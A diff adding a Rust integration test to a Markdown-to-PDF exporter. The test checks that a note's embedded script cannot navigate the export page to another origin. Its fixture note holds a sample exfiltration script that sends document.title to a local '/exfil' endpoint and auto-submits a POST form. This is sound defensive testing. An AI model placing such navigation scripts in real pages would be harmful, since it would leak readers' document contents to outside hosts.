@@ -200,3 +200,94 @@ fn a_missing_output_folder_fails_clearly() {
     assert_eq!(status.code(), Some(2), "{stderr}");
     assert!(stderr.contains("does not exist"), "{stderr}");
 }
+
+/// A tiny HTTP server on another origin (another port) that answers every
+/// request with a page saying `LEFTMARKER` and counts the requests.
+fn spawn_sink_server() -> (u16, std::sync::Arc<std::sync::atomic::AtomicUsize>) {
+    use std::io::{Read, Write};
+    use std::sync::Arc;
+    use std::sync::atomic::{AtomicUsize, Ordering};
+
+    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind");
+    let port = listener.local_addr().expect("addr").port();
+    let hits = Arc::new(AtomicUsize::new(0));
+    let counter = Arc::clone(&hits);
+    // Left running for the rest of the test process.
+    std::thread::spawn(move || {
+        for mut stream in listener.incoming().flatten() {
+            counter.fetch_add(1, Ordering::SeqCst);
+            let mut request = [0_u8; 4096];
+            let _ = stream.read(&mut request);
+            let body = "<!doctype html><title>left</title><p>LEFTMARKER</p>";
+            let _ = write!(
+                stream,
+                "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {}\r\n\
+                 Connection: close\r\n\r\n{body}",
+                body.len()
+            );
+        }
+    });
+    (port, hits)
+}
+
+/// A note's script cannot take the export page (and what it read from the
+/// server) to another origin: the navigation is refused before any request,
+/// the page stays and is the one printed. (Measured on macOS: after a refused
+/// navigation started while the page is still parsing, as here, the page never
+/// reports ready and the export goes ahead at the timeout; one started later
+/// does not delay it.)
+#[test]
+fn a_script_cannot_navigate_the_export_away() {
+    if !enabled() {
+        return;
+    }
+    let (port, hits) = spawn_sink_server();
+    let repo = tempfile::tempdir().expect("tempdir");
+    std::fs::create_dir(repo.path().join(".mbr")).expect("mkdir .mbr");
+    let note = repo.path().join("leave.md");
+    std::fs::write(
+        &note,
+        format!(
+            "# Navigation test\n\n\
+             STAYMARKER: a note whose script tries to leave the export page.\n\n\
+             <form id=\"f\" method=\"post\" action=\"http://127.0.0.1:{port}/form\">\
+             <input name=\"d\" value=\"x\"></form>\n\n\
+             <script>\n\
+             location.href = 'http://127.0.0.1:{port}/exfil?d=' + encodeURIComponent(document.title);\n\
+             setTimeout(function () {{ document.getElementById('f').submit(); }}, 50);\n\
+             </script>\n"
+        ),
+    )
+    .expect("write note");
+    let target = repo.path().join("leave.pdf");
+    let (status, stderr, _) = mbr_pdf(
+        &note,
+        &[
+            "--output",
+            target.to_str().expect("utf-8 path"),
+            "--pdf-timeout-ms",
+            "10000",
+        ],
+    );
+    assert!(status.success(), "mbr --pdf failed: {status}\n{stderr}");
+    for path in ["exfil?d=", "form"] {
+        assert!(
+            stderr.contains(&format!(
+                "tried to navigate to http://127.0.0.1:{port}/{path}"
+            )),
+            "the navigation to /{path} was not refused:\n{stderr}"
+        );
+    }
+    assert_eq!(
+        hits.load(std::sync::atomic::Ordering::SeqCst),
+        0,
+        "the other origin was asked for something:\n{stderr}"
+    );
+    let doc = Document::load_mem(&std::fs::read(&target).expect("the PDF exists"))
+        .expect("lopdf reads it");
+    let text = page_text(&doc);
+    assert!(
+        text.contains("STAYMARKER") && !text.contains("LEFTMARKER"),
+        "the printed page is not the note:\n{text}"
+    );
+}
